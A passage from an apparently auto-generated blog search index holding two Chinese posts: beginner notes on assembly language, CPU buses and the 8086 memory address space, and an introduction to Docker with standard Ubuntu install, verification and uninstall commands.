    <content type="html"><![CDATA[<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-汇编语言简介"><a href="#1-汇编语言简介" class="headerlink" title="1. 汇编语言简介"></a>1. 汇编语言简介</h2><p><em><strong>从机器语言到汇编语言：</strong></em></p><p><strong>机器语言</strong>：由“0”“1”数字编成，以二进制为基础表示电子器件的高低电平，从而执行机器指令，进行运算。</p><p>明显弊端：难以书写和阅读，复杂难懂。</p><p>于是，程序员写出了编译器来翻译机器语言，汇编语言诞生了。</p><p><strong>汇编语言</strong>：主体为汇编指令。如“mov ax,bx”。操作对象为CPU、寄存器和内存。</p><h2 id="2-CPU基本工作原理"><a href="#2-CPU基本工作原理" class="headerlink" title="2. CPU基本工作原理"></a>2. CPU基本工作原理</h2><blockquote><p>CPU 是计算机的核心部件，它控制整个计算机的运作并进行运算。要想让一个CPU工作，就必须向它提供指令和数据。指令和数据在存储器中存放，也就是我们平时所说的内存。 </p></blockquote><h3 id="2-1-存储单元、指令和数据"><a href="#2-1-存储单元、指令和数据" class="headerlink" title="2.1 存储单元、指令和数据"></a>2.1 存储单元、指令和数据</h3><p><strong>指令和数据：</strong></p><blockquote><p>指令和数据是应用上的概念。在内存或磁盘上，指令和数据没有任何区别，都是二进制信息。<strong>CPU 在工作的时候把有的信息看作指令，有的信息看作数据，为同样的信息赋予了不同的意义。</strong>（）</p></blockquote><p><strong>存储单元：</strong></p><blockquote><p>存储器被划分成若干个存储单元，每个存储单元从0开始顺序编号。一个存储器能存储128个Byte。</p></blockquote><p>内存计量单位：<br>8bit&#x3D;1B   1KB&#x3D;1024B   1MB&#x3D;1024KB            1GB&#x3D;1024MB   1TB&#x3D;1024GB</p><h3 id="2-2-CPU对存储器的读写"><a href="#2-2-CPU对存储器的读写" class="headerlink" title="2.2 CPU对存储器的读写"></a>2.2 CPU对存储器的读写</h3><blockquote><p>存储器被划分成多个存储单元，存储单元从零开始顺序编号。这些编号可以看作存储单元在存储器中的<strong>地址</strong>。<br>CPU 要从内存中读数据，<strong>首先要指定存储单元的地址</strong><br>CPU 在读写数据时还要指明，它要对哪一个器件进行操作，进行哪种操作，是从中读出数据，还是向里面写入数据。</p></blockquote><p>可见，CPU想进行数据的读写需要和外部器件进行以下三类信息交互：</p><ul><li>存储单元的地址(<strong>地址信息</strong>);</li><li>器件的选择，读或写的命令(<strong>控制信息</strong>); </li><li>读或写的数据(<strong>数据信息</strong>)。</li></ul><h3 id="2-3-三大总线"><a href="#2-3-三大总线" class="headerlink" title="2.3 三大总线"></a>2.3 三大总线</h3><p>CPU通过导线将电信号传到存储器芯片中，从而实现信息的交互。</p><blockquote><p>在计算机中专门有连接 CPU 和其他芯片的导线，通常称为总线。总线从物理上来讲，就是一根根导线的集合。 根据传送信息的不同，总线从逻辑上又分为3类，<strong>地址总线、控制总线和数据总线</strong>。<br>示例：<br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182000049.png"><br>(1) CPU通过地址线将地址信息了发出。<br>(2) CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据。<br>(3) 存储器将3号单元中的数据8通过数据线送入CPU。<br>写操作与读操作的步骤相似。如向3号单元写入数据26:<br>(1) CPU通过地址线将地址信息了发出。<br>(2) CPU通过控制线发出内存写命令，选中存储器芯片，并通知它，要向其中写入数据。<br>(3) CPU通过数据线將数据26送入内存的3号单元中。</p></blockquote><p>要让一个计算机或微处理器工作，应向它输入能够驱动它进行工作的电平信息(机器码)。CPU 按收这条机器码后将完成我们上面所述的读写工作。 机器码难于记忆，用汇编指令来表示，情况如下。<br>机器码: 10100001 00000011 00000000<br>对应的汇编指令:MOV AX,[3]<br>含义: 传送3号单元的内容入AX</p><p><strong>由此可见，汇编指令可以方便地直接对CPU进行操作。</strong></p><blockquote><p><strong>地址总线：</strong> CPU是通过地址总线来指定存储器单元的，地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址。<br>一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N。这样的CPU可以寻找2ⁿ个内存单元。</p></blockquote><blockquote><p><strong>数据总线：</strong> CPU与内存或其他器件之间的数据传送是通过数据总线来进行的。数据总线的宽度决定了CPU和外界的数据传送速度。<br>8根数据总线一次可传送一个8位二进制数据(即一个字节)。16根数据总线一次可传送两个字节。</p></blockquote><blockquote><p><strong>控制总线：</strong> CPU对外部器件的控制是通过控制总线来进行的。在这里控制总线是个总称，控制总线是一些不同控制线的集合。有多少根控制总线，就意味着 CPU 提供了对外部器件的多少种控制。所以，控制总线的宽度决定了CPU 对外部器件的控制能力。</p></blockquote><ul><li>地址总线的宽度决定了CPU 的寻址能力;</li><li>数据总线的宽度决定了CPU 与其他器件进行数据传送时的一次数据传送量: </li><li>控制总线的宽度决定了CPU 对系统中其他器件的控制能力。</li></ul><h2 id="3-内存地址空间"><a href="#3-内存地址空间" class="headerlink" title="3. 内存地址空间"></a>3. 内存地址空间</h2><p>CPU在操控存储器的时候，把它们都当作内存来对待，把它们总的看作一个由若干存储单元组成的逻辑存储器，这个逻辑存储器就是我们所说的内存地址空间。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404181959748.png"></p><p>在图1. 8中，所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器，每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间。CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据。</p><blockquote><p>内存地址空间的大小受CPU地址总线宽度的限制。8086CPU的地址总线宽度为20，可以传送2²⁰个不同的地址信息(大小从0至2²⁰−1)。即可定位2²⁰个内存单元，则8086PC的内存地址空间大小为1MB。同理，80386CPU的地址总线宽度为32，则内存地址空间最大为4GB。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker简介</title>
    <link href="/2023/07/30/Docker/Docker%E7%AE%80%E4%BB%8B/"/>
    <url>/2023/07/30/Docker/Docker%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h1><h2 id="出现背景"><a href="#出现背景" class="headerlink" title="出现背景"></a>出现背景</h2><p>将环境与项目一起安装打包，避免部署环境的繁杂工作</p><p>及跨平台问题</p><p>Java — apk — 发布（应用商店） — 使用apk — 安装即可用</p><p>java — jar(环境) — 打包项目带上环境（镜像）— (Docker仓库：商店) — 下载发布的镜像 — 直接运行</p><h2 id="开发思想"><a href="#开发思想" class="headerlink" title="开发思想"></a>开发思想</h2><p>集装箱（&#x3D;&#x3D;互相隔离&#x3D;&#x3D;的项目）</p><p>jar — 多个应用（端口冲突）— 交叉并行</p><p>Docker利用隔离机制，将服务器利用到极致</p><h2 id="历史发展"><a href="#历史发展" class="headerlink" title="历史发展"></a>历史发展</h2><p>pass云计算服务+LXC容器技术 — Docker（容器化技术&#x3D;&#x3D;也是虚拟化技术！&#x3D;&#x3D;）</p><p>比虚拟机轻巧，方便，启动速度快，占用内存小（但完整）</p><p>区别：</p><blockquote><p>vm:linux centos 原生镜像互相隔离，需要开启多个虚拟机</p><p>docker : 隔离，镜像（4m+jdk+mysql）小巧，运行镜像就可以，几M，秒级启动 </p></blockquote><h2 id="关于Docker"><a href="#关于Docker" class="headerlink" title="关于Docker"></a>关于Docker</h2><p>&#x3D;&#x3D;基于Go语言开发&#x3D;&#x3D;</p><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p><p>帮助文档：<a href="https://docs.docker.com/">https://docs.docker.com/</a>很详细</p><p>仓库地址：<a href="https://hub.docker.com/">https://hub.docker.com/</a>与git类似</p><h2 id="隔离机制"><a href="#隔离机制" class="headerlink" title="隔离机制"></a>隔离机制</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182156620.png" alt="image-20230726232454445"></p><p>​虚拟机（内核+操作环境+APP）</p><blockquote><ul><li>资源占用大</li><li>启动步骤冗余，慢！</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182156121.png"></p><p>​Docker（内核+镜像） </p><blockquote><ul><li>容器化技术（&#x3D;&#x3D;不是完整的操作系统&#x3D;&#x3D;）</li><li>容器内的应用直接运行在宿主机的内容，容器没有自己的内核，也没有虚拟硬件，所以轻便</li></ul></blockquote><h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>更快速的交付和部署</p><p>更便捷的升级和扩缩容（镜像一键运行）</p><p>更简单的系统运维</p><p>更高效的资源利用（内核级别的虚拟化）</p><h2 id="基本组成"><a href="#基本组成" class="headerlink" title="基本组成"></a>基本组成</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182156484.png" alt="image-20230728124422847"></p><p><strong>Client（客户端）</strong></p><blockquote><p>docker build创建</p><p>docker pull选取</p><p>docker run运行</p></blockquote><p><strong>DOCKER_HOST(服务器）</strong></p><blockquote><p>Images（镜像）&#x3D;&#x3D;类似于C++中的类&#x3D;&#x3D;（用于创建容器服务）</p><p>Containers（容器）&#x3D;&#x3D;类似于C++中类创建的对象&#x3D;&#x3D;（负责运行具体项目）</p></blockquote><p>**Registry（仓库） **</p><p>存放镜像的地方</p><p>分公有和私有</p><h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><p>Docker 并非是一个通用的容器工具，它依赖于已存在并运行的 Linux 内核环境。</p><p>Docker 实质上是在已经运行的 Linux 下制造了一个隔离的文件环境，因此，Docker 必须部署在 Linux 内核的系统上。如果其他系统想部署 Docker 就必须安装一个虚拟 Linux 环境。</p><p>鉴于CentOS在2024年将不再进行更新维护，我选择在Ubuntu上安装Docker</p><h2 id="Ubuntu安装"><a href="#Ubuntu安装" class="headerlink" title="Ubuntu安装"></a>Ubuntu安装</h2><h3 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h3><p>旧版本的 Docker 的名称为 、 或 。在尝试安装之前卸载任何此类旧版本 新版本：dockerdocker.iodocker-engine :::tips sudo apt-get remove docker docker-engine docker.io containerd runc ::: 如果报告未安装这些包，则没关系。apt-get 存储在<code>/var/lib/docker/</code>中的镜像、容器、卷和网络不是 卸载 Docker 时自动删除。</p><h3 id="使用存储库安装"><a href="#使用存储库安装" class="headerlink" title="使用存储库安装"></a>使用存储库安装</h3><p>在新主机上首次安装 Docker 引擎之前，您需要 需要设置 Docker 存储库。之后，您可以安装和更新 存储库中的 Docker。</p><h4 id="设置存储库"><a href="#设置存储库" class="headerlink" title="设置存储库"></a>设置存储库</h4><ol><li>更新软件包索引并安装软件包以允许使用 基于 HTTPS 的存储库：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br>sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install \<br>    ca<span class="hljs-operator">-</span>certificates \<br>    curl \<br>    gnupg \<br>    lsb<span class="hljs-operator">-</span><span class="hljs-keyword">release</span><br></code></pre></td></tr></table></figure><ol><li>添加 Docker 的官方 GPG 密钥：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/apt/keyrings<br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg<br></code></pre></td></tr></table></figure><ol><li>使用以下命令设置存储库：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> \<br>  <span class="hljs-string">&quot;deb [arch=<span class="hljs-subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span><br><span class="hljs-string">  <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null<br></code></pre></td></tr></table></figure><h4 id="安装-Docker-engine"><a href="#安装-Docker-engine" class="headerlink" title="安装 Docker engine"></a>安装 Docker engine</h4><p>要安装最新版本，请运行：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin<br></code></pre></td></tr></table></figure><p>通过运行映像验证 Docker 引擎安装是否成功</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo docker run hello-world<br></code></pre></td></tr></table></figure><p>现在你已经成功安装并启动了Docker engine。用户组存在，但是它不包含任何用户，这就是需要你用<code>sudo</code>运行docker命令的原因。你可以执行在CentOS安装Docker engine的后续步骤来允许非root用户运行docker命令。</p><h3 id="从包安装"><a href="#从包安装" class="headerlink" title="从包安装"></a>从包安装</h3><p>如果你不能使用 Docker 的仓库来安装 Docker Engine，你可以 下载适用于您的版本的文件并手动安装。你需要 每次要升级 Docker 引擎时下载一个新文件。</p><ol><li>转到<a href="https://link.juejin.cn/?target=https://download.docker.com/linux/ubuntu/dists/">download.docker.com&#x2F;linux&#x2F;ubunt…</a>.</li><li>在列表中选择你的 Ubuntu 版本。</li><li>转到并选择适用的体系结构。</li><li>下载以下适用于 Docker 引擎、CLI、containerd 和 和 Docker Compose 包：deb<ul><li>containerd.io  .deb</li><li>docker-ce  .deb</li><li>docker-ce-cli  .deb</li><li>docker-compose-plugin  .deb</li></ul></li><li>安装软件包。将以下示例中的路径更新为 你下载了 Docker 软件包的位置。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dpkg -i ./containerd.io_&lt;version&gt;_&lt;<span class="hljs-built_in">arch</span>&gt;.deb \<br>  ./docker-ce_&lt;version&gt;_&lt;<span class="hljs-built_in">arch</span>&gt;.deb \<br>  ./docker-ce-cli_&lt;version&gt;_&lt;<span class="hljs-built_in">arch</span>&gt;.deb \<br>  ./docker-compose-plugin_&lt;version&gt;_&lt;<span class="hljs-built_in">arch</span>&gt;.deb<br></code></pre></td></tr></table></figure><p>Docker 守护程序会自动启动。</p><ol><li>通过运行映像验证 Docker 引擎安装是否成功：</li></ol><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo docker run hello-world<br></code></pre></td></tr></table></figure><p>现在你已经成功安装并启动了Docker engine。用户组存在，但是它不包含任何用户，这就是需要你用<code>sudo</code>运行docker命令的原因。你可以执行在CentOS安装Docker engine的后续步骤来允许非root用户运行docker命令。</p><h3 id="自动化脚本安装"><a href="#自动化脚本安装" class="headerlink" title="自动化脚本安装"></a>自动化脚本安装</h3><p>自动化脚本可以自动检测Linux发行版，因此在受支持的Linux发行版中运行自动化脚本的步骤是一致的，如果你想使用自动化脚本来安装Docker engine，请参阅在CentOS中安装Docker engine的使用自动化脚本安装一节。</p><h3 id="二进制文件安装"><a href="#二进制文件安装" class="headerlink" title="二进制文件安装"></a>二进制文件安装</h3><p>不建议在生产环境中使用二进制文件安装Docker engine，如果你的容器技术专家建议你这么做，那么请换一个专家。 二进制文件安装主要是为了不受支持的平台和测试环境中使用。我将简短的介绍在Linux上安装守护程序和客户端二进制文件。</p><h4 id="安装静态二进制文件"><a href="#安装静态二进制文件" class="headerlink" title="安装静态二进制文件"></a>安装静态二进制文件</h4><p>1.下载静态二进制压缩包，转到<a href="https://link.juejin.cn/?target=https://download.docker.com/linux/static/stable/">download.docker.com&#x2F;linux&#x2F;stati…</a>，选择适合你的压缩包。 2.提取压缩包中的二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar xf /path/to/&lt;FILE&gt;.tar.gz<br></code></pre></td></tr></table></figure><p>3.这一步可选，将二进制文件移动到可执行文件路径下，如果没有这一步，则必须提供调用可执行文件的路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cp</span> docker/* /usr/bin/<br></code></pre></td></tr></table></figure><p>4.启动 Docker 守护进程：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo dockerd &amp;<br></code></pre></td></tr></table></figure><p>如果尼西亚使用其他选项启动守护进程，请修改上述内容命令或创建并编辑文件<code>/etc/docker/daemon.json</code>以添加自定义配置选项。</p><h3 id="验证是否安装成功"><a href="#验证是否安装成功" class="headerlink" title="验证是否安装成功"></a>验证是否安装成功</h3><p> 5.通过运行镜像来验证 Docker 是否已正确安装。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo docker run hello-world<br></code></pre></td></tr></table></figure><p>此命令下载测试映像并在容器中运行它。当 容器运行，它会打印一条消息并退出。</p><p><img src="/../../images/Docker/image-20230802220618685.png" alt="image-20230802220618685"></p><p>第一次打开Docker的“hello-world”文件会先显示以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Unable to find image <span class="hljs-string">&#x27;hello-world:latest&#x27;</span> locally（本地无此文件）<br>Pulling repository hello-world（从Docker官方库中拉取相关信息）<br>91c95931e552: Download complete<br>a8219747be10: Download complete<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> hello-world:latest（下载完成）<br></code></pre></td></tr></table></figure><p>这意味着你的Docker安装成功了</p><p>我们可以查看刚刚下载的hello-world镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker images<br></code></pre></td></tr></table></figure><p><img src="/../../images/Docker/image-20230802223312044.png" alt="image-20230802223312044"></p><p>也可以查看当前docker版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -v<br></code></pre></td></tr></table></figure><p><img src="/../../images/Docker/image-20230802224541726.png" alt="image-20230802224541726"></p><h1 id="Docker卸载"><a href="#Docker卸载" class="headerlink" title="Docker卸载"></a>Docker卸载</h1><p>删除安装包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get purge docker-ce<br></code></pre></td></tr></table></figure><p>删除镜像、容器、配置文件等内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo rm -rf /var/lib/docker<br><span class="hljs-meta prompt_"># </span><span class="language-bash">docker默认工作路径！</span><br></code></pre></td></tr></table></figure><h1 id="阿里云镜像加速"><a href="#阿里云镜像加速" class="headerlink" title="阿里云镜像加速"></a>阿里云镜像加速</h1>]]></content>
    
    
    <categories>
      
      <category>软件</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
